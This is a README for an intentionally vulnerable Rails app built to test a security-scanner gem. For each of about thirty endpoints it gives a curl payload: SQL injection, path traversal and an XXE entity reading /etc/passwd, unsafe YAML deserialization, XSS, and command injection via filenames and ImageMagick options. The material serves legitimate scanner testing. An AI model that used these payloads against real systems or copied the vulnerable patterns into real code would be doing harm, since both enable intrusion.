# Vuln Chaser Test App

A Rails 7.1 application specifically designed to test and validate the vuln-chaser gem's detection capabilities.

https://github.com/Pirikara/vuln-chaser

## Purpose

This application contains intentionally vulnerable code patterns to:
- Test vuln-chaser gem's detection accuracy
- Compare results with other security tools (Brakeman, CodeQL)
- Demonstrate advanced vulnerability patterns that may bypass standard security scanners

## Features

- User search functionality with dynamic query execution
- Interactor pattern implementation using interactor-rails
- Carefully crafted vulnerable patterns for testing
- Security analysis setup with Brakeman and CodeQL

## Setup

```bash
bundle install
rails db:create db:migrate db:seed
rails server
```

## Test Endpoints

### Basic Endpoints
- `GET /test/sql` - Basic SQL injection test
- `POST /test/auth` - Simple authentication bypass  
- `GET /test/health` - Health check endpoint

### Administrative Endpoints
The application includes sophisticated administrative endpoints under `/admin/` that contain various security vulnerabilities for testing purposes:

- `GET /admin/users?name=<query>` - User search functionality
- `POST /admin/auth` - Administrative authentication
- `GET /admin/files?filename=<file>` - File download system
- `GET /admin/settings?config=<config>` - System configuration access
- `POST /admin/feedback` - User feedback collection
- `POST /admin/register` - User registration processing
- `POST /admin/import` - XML data import functionality
- `POST /admin/config` - YAML configuration loading
- `POST /admin/documents` - File upload system
- `POST /admin/analytics` - Request tracking system
- `POST /admin/sessions` - Session management
- `POST /admin/tokens` - Token verification system
- `POST /admin/xml-legacy` - Legacy XML processing
- `POST /admin/json-complex` - Complex JSON processing
- `POST /admin/markdown` - Markdown rendering
- `POST /admin/convert` - Document conversion
- `POST /admin/json-legacy` - Legacy JSON parsing

### Advanced System Endpoints
- `POST /system/verify` - Cryptographic signature verification
- `POST /system/workflow` - Multi-step workflow processing
- `POST /system/binary` - Binary data analysis
- `POST /system/calculate` - Mathematical computation engine
- `POST /system/normalize` - Unicode identifier normalization
- `POST /system/deserialize` - Object deserialization processing

### Payment Processing Endpoints
- `POST /payment/process` - Transaction processing
- `POST /payment/refund` - Refund processing
- `POST /payment/discount` - Discount code validation
- `POST /payment/pricing` - Dynamic pricing calculation

### Image Processing Endpoints (Library-Level Vulnerabilities)
- `POST /image/mini-magick` - Image processing with MiniMagick gem
- `POST /image/image-processing` - Processing with ImageProcessing gem
- `POST /image/batch` - Batch image processing
- `GET /image/info` - ImageMagick version and configuration info

## Vulnerability Testing Guide

### 1. SQL Injection (GET /admin/users)
```bash
curl "http://localhost:3000/admin/users?name=test' OR '1'='1"
```
**Expected**: Direct SQL parameter interpolation vulnerability

### 2. Path Traversal (GET /admin/files, /admin/settings)
```bash
curl "http://localhost:3000/admin/files?filename=../../../etc/passwd"
curl "http://localhost:3000/admin/settings?config=../../../etc/passwd"
```
**Expected**: Directory traversal with URL decoding

### 3. XXE Injection (POST /admin/import)
```bash
curl -X POST http://localhost:3000/admin/import \
  -H "Content-Type: application/json" \
  -d '{"xml_data": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root><data>&xxe;</data></root>"}'
```
**Expected**: XML External Entity vulnerability in REXML

### 4. YAML Deserialization (POST /admin/config)
```bash
curl -X POST http://localhost:3000/admin/config \
  -H "Content-Type: application/json" \
  -d '{"yaml_data": "--- !ruby/object:File {}"}'
```
**Expected**: Unsafe YAML loading with Psych.load

### 5. XSS (POST /admin/feedback)
```bash
curl -X POST http://localhost:3000/admin/feedback \
  -H "Content-Type: application/json" \
  -d '{"comment": "<script>alert(1)</script>"}'
```
**Expected**: Stored XSS via .html_safe

### 6. Mass Assignment (POST /admin/register)
```bash
curl -X POST http://localhost:3000/admin/register \
  -H "Content-Type: application/json" \
  -d '{"name": "user", "email": "test@test.com", "role": "admin", "admin": true}'
```
**Expected**: Role/admin privilege escalation

### 7. File Upload (POST /admin/documents)
```bash
curl -X POST http://localhost:3000/admin/documents \
  -F "file=@malicious.php"
```
**Expected**: Unrestricted file upload without validation

### 8. Race Condition (POST /admin/analytics)
```bash
# Run multiple concurrent requests
for i in {1..10}; do
  curl -X POST http://localhost:3000/admin/analytics \
    -H "Content-Type: application/json" \
    -d '{"user_id": "test"}' &
done
```
**Expected**: Race condition in counter increment

### 9. Session Fixation (POST /admin/sessions)
```bash
curl -X POST http://localhost:3000/admin/sessions \
  -H "Content-Type: application/json" \
  -d '{"user_id": "victim", "session_id": "attacker_controlled", "admin": "true"}'
```
**Expected**: Session fixation accepting external session ID

### 10. Timing Attack (POST /admin/tokens)
```bash
curl -X POST http://localhost:3000/admin/tokens \
  -H "Content-Type: application/json" \
  -d '{"secret": "super_secret_key_12345"}' \
  --write-out "%{time_total}\n"
```
**Expected**: Timing differences reveal secret information

### 11. Authentication Bypass (POST /admin/auth)
```bash
curl -X POST http://localhost:3000/admin/auth \
  -H "Content-Type: application/json" \
  -d '{"password": "admin123"}'
```
**Expected**: Hardcoded password vulnerability

### 12. Legacy XML Processing (POST /admin/xml-legacy)
```bash
curl -X POST http://localhost:3000/admin/xml-legacy \
  -H "Content-Type: application/json" \
  -d '{"xml_data": "<test>vulnerable xml</test>"}'
```
**Expected**: OX gem parsing vulnerabilities

### 13. Complex JSON Processing (POST /admin/json-complex)
```bash
curl -X POST http://localhost:3000/admin/json-complex \
  -H "Content-Type: application/json" \
  -d '{"json_data": "{\"test\": \"complex json\"}"}'
```
**Expected**: OJ gem parsing vulnerabilities

### 14. Markdown Rendering (POST /admin/markdown)
```bash
curl -X POST http://localhost:3000/admin/markdown \
  -H "Content-Type: application/json" \
  -d '{"markdown": "# Test\n<script>alert(1)</script>"}'
```
**Expected**: Redcarpet XSS vulnerabilities

### 15. Document Conversion (POST /admin/convert)
```bash
curl -X POST http://localhost:3000/admin/convert \
  -H "Content-Type: application/json" \
  -d '{"document": "# Test\n<img src=x onerror=alert(1)>"}'
```
**Expected**: Kramdown HTML injection vulnerabilities

### 16. Legacy JSON Parsing (POST /admin/json-legacy)
```bash
curl -X POST http://localhost:3000/admin/json-legacy \
  -H "Content-Type: application/json" \
  -d '{"data": "{\"test\": \"legacy json\"}"}'
```
**Expected**: JSON gem parsing vulnerabilities

## Advanced Vulnerability Testing Guide

### 17. Cryptographic Timing Attack (POST /system/verify)
```bash
curl -X POST http://localhost:3000/system/verify \
  -H "Content-Type: application/json" \
  -d '{"message": "test", "signature": "deadbeef"}'
```
**Expected**: Microsecond-level timing vulnerabilities in custom HMAC implementation

### 18. Hidden Privilege Escalation (POST /system/workflow)
```bash
# Step 1: Initialize workflow
curl -X POST http://localhost:3000/system/workflow \
  -H "Content-Type: application/json" \
  -d '{"step": 1, "action_type": "initialize", "user_id": "admin_123_temp"}'

# Step 2: Trigger hidden privilege escalation
curl -X POST http://localhost:3000/system/workflow \
  -H "Content-Type: application/json" \
  -d '{"step": 2, "action_type": "validate"}'

# Step 3: Finalize with elevated permissions
curl -X POST http://localhost:3000/system/workflow \
  -H "Content-Type: application/json" \
  -d '{"step": 3, "action_type": "finalize"}'
```
**Expected**: Complex state machine with hidden admin privilege escalation

### 19. Memory Corruption via Binary Processing (POST /system/binary)
```bash
curl -X POST http://localhost:3000/system/binary \
  -H "Content-Type: application/json" \
  -d '{"binary_data": "'"$(echo -n 'AAAA' | base64)"'", "format": "header"}'
```
**Expected**: FFI-based memory vulnerabilities and potential arbitrary file access

### 20. Integer Overflow Attack (POST /system/calculate)
```bash
curl -X POST http://localhost:3000/system/calculate \
  -H "Content-Type: application/json" \
  -d '{"base": 999999999, "multiplier": 999999999, "iterations": 1000000}'
```
**Expected**: Integer overflow leading to memory/CPU DoS

### 21. Unicode Normalization Bypass (POST /system/normalize)
```bash
curl -X POST http://localhost:3000/system/normalize \
  -H "Content-Type: application/json" \
  -d '{"identifier": "ａｄｍｉｎ", "normalization": "NFKC"}'
```
**Expected**: Unicode compatibility characters bypassing admin detection

### 22. Unsafe Deserialization RCE (POST /system/deserialize)
```bash
# YAML deserialization attack
curl -X POST http://localhost:3000/system/deserialize \
  -H "Content-Type: application/json" \
  -d '{"object_data": "'"$(echo '--- !ruby/object:Proc {}' | base64)"'", "format": "yaml"}'
```
**Expected**: Remote code execution via unsafe deserialization

### 23. Payment Race Condition (POST /payment/process)
```bash
# Run multiple concurrent transactions with same ID
for i in {1..5}; do
  curl -X POST http://localhost:3000/payment/process \
    -H "Content-Type: application/json" \
    -d '{"amount": 100, "user_id": "user1", "transaction_id": "race_test_001"}' &
done
```
**Expected**: Race condition allowing double-spending

### 24. Floating Point Precision Attack (POST /payment/refund)
```bash
curl -X POST http://localhost:3000/payment/refund \
  -H "Content-Type: application/json" \
  -d '{"user_id": "user1", "refund_amount": 999999.99, "currency": "USD", "metadata": {"original_amount": 0.01}}'
```
**Expected**: Precision errors in currency calculations allowing fraud

### 25. Discount Code Timing Attack (POST /payment/discount)
```bash
# Time-based discount code enumeration
curl -X POST http://localhost:3000/payment/discount \
  -H "Content-Type: application/json" \
  -d '{"code": "SAVE10"}' \
  --write-out "Time: %{time_total}s\n"
```
**Expected**: Character-by-character timing reveals valid discount codes

### 26. Price Manipulation Algorithm (POST /payment/pricing)
```bash
curl -X POST http://localhost:3000/payment/pricing \
  -H "Content-Type: application/json" \
  -d '{
    "base_price": 100,
    "pricing_metadata": {
      "demand_factor": -0.5,
      "user_tier": "internal",
      "location": "INTERNAL"
    }
  }'
```
**Expected**: Price manipulation through hidden algorithm parameters

## Library-Level Vulnerability Testing Guide

### 27. MiniMagick Command Injection (POST /image/mini-magick)
```bash
# Create a simple test image (1x1 pixel)
echo -n 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==' > test_image.b64

curl -X POST http://localhost:3000/image/mini-magick \
  -H "Content-Type: application/json" \
  -d '{
    "image_data": "'$(cat test_image.b64)'",
    "filename": "test;whoami;.jpg",
    "operation": "custom",
    "command": "identify; whoami; echo"
  }'
```
**Expected**: Command injection via filename and command parameters (CVE-2022-32323)

### 28. ImageProcessing Options Injection (POST /image/image-processing)
```bash
curl -X POST http://localhost:3000/image/image-processing \
  -H "Content-Type: application/json" \
  -d '{
    "image_data": "'$(cat test_image.b64)'",
    "options": {
      "define": "delegate:decode=echo INJECTION_TEST",
      "authenticate": "|whoami"
    }
  }'
```
**Expected**: ImageMagick options manipulation leading to command execution

### 29. Batch Processing Command Injection (POST /image/batch)
```bash
curl -X POST http://localhost:3000/image/batch \
  -H "Content-Type: application/json" \
  -d '{
    "images": [
      {
        "data": "'$(cat test_image.b64)'",
        "method": "mini_magick",
        "size": "100x100"
      }
    ],
    "batch_options": {
      "command": "whoami; echo BATCH_INJECTION;"
    }
  }'
```
**Expected**: Command injection via MiniMagick in batch processing

### 30. ImageMagick Information Disclosure (GET /image/info)
```bash
curl http://localhost:3000/image/info
```
**Expected**: Version information disclosure revealing vulnerable ImageMagick versions

## Security Testing Architecture

The application focuses on **application-level vulnerabilities** rather than dependency-level CVEs:

### Basic Vulnerable Code Patterns
- **SQL Injection**: Direct parameter interpolation in raw SQL
- **XXE (XML External Entity)**: Unsafe REXML parsing allowing external entity references
- **YAML Deserialization**: Using `Psych.load` without sanitization (RCE risk)
- **Path Traversal**: Direct file path construction from user input
- **Mass Assignment**: Unfiltered parameter assignment to sensitive fields
- **Session Fixation**: Accepting externally-provided session IDs
- **Race Conditions**: Non-atomic operations on shared resources
- **Timing Attacks**: Non-constant-time secret comparison
- **XSS**: Using `.html_safe` without proper escaping
- **File Upload**: No validation on file type or content

### Advanced Vulnerable Code Patterns
- **Cryptographic Implementation Flaws**: Custom HMAC with microsecond timing vulnerabilities
- **Complex State Machine Exploits**: Hidden privilege escalation through workflow manipulation
- **Memory Corruption**: FFI-based unsafe memory operations
- **Integer Overflow**: Arithmetic operations without bounds checking
- **Unicode Normalization Attacks**: Semantic bypass through character compatibility
- **Unsafe Object Deserialization**: Marshal/YAML allowing arbitrary code execution
- **Financial Logic Race Conditions**: Non-atomic payment processing operations
- **Floating Point Precision Exploits**: Currency calculation manipulation
- **Algorithm Parameter Injection**: Hidden pricing algorithm manipulation
- **Multi-step Timing Side Channels**: Character-by-character secret enumeration

### Vulnerable Dependencies

**Basic Processing Libraries:**
- `rexml ~> 3.2.5` - XXE vulnerabilities in XML processing
- `psych ~> 4.0.0` - YAML deserialization vulnerabilities  
- `json ~> 2.6.0` - JSON parsing vulnerabilities
- `ox ~> 2.14.0` - XML parser with known security issues
- `oj ~> 3.13.0` - JSON parser with potential vulnerabilities
- `redcarpet ~> 3.5.0` - Markdown parser with XSS vulnerabilities
- `kramdown ~> 2.3.0` - Markdown parser with HTML injection issues
- `addressable ~> 2.8.0` - URL parsing vulnerabilities

**ImageMagick Ecosystem (Critical CVEs):**
- `mini_magick ~> 4.11.0` - Command injection vulnerabilities (CVE-2022-32323)
- `image_processing ~> 1.9.0` - ImageMagick command injection via options

## Development
This project uses:

- Ruby 3.4.1  
- Rails 7.1.x
- SQLite3
- interactor-rails
- Brakeman for security scanning
- Vulnerable dependencies and application-level vulnerability patterns

## Important Notes

⚠️ **CRITICAL Security Warning**: This application contains **EXTREMELY DANGEROUS** intentional security vulnerabilities including:

- **Remote Code Execution** capabilities via deserialization
- **Memory corruption** vulnerabilities that could crash the system
- **Cryptographic timing attacks** that can leak secrets
- **Financial logic flaws** that could cause monetary loss
- **Integer overflow** attacks that can cause system instability

**NEVER deploy this application to production or any networked environment.** Use only in completely isolated development environments for security research and testing purposes.

### Vulnerability Complexity Levels

**Level 1 (Basic)**: Standard vulnerabilities detectable by most security scanners
- SQL Injection, XSS, Path Traversal, Mass Assignment

**Level 2 (Intermediate)**: Vulnerabilities requiring deeper code analysis  
- Session Fixation, Race Conditions, File Upload issues

**Level 3 (Advanced)**: Sophisticated vulnerabilities requiring expert analysis
- Cryptographic timing attacks, Unicode normalization bypasses, Complex state machine exploits

**Level 4 (Expert)**: Highly subtle vulnerabilities requiring deep security expertise
- Microsecond timing side channels, Memory corruption via FFI, Algorithm parameter injection

**Level 5 (Research)**: Novel attack vectors requiring specialized knowledge
- Multi-step privilege escalation chains, Floating point precision exploits, Hidden workflow bypasses

**Level 6 (Library-Deep)**: Vulnerabilities requiring deep library source code analysis
- ImageMagick command injection via gem interfaces, Library-specific CVE exploitation, Indirect vulnerability chains
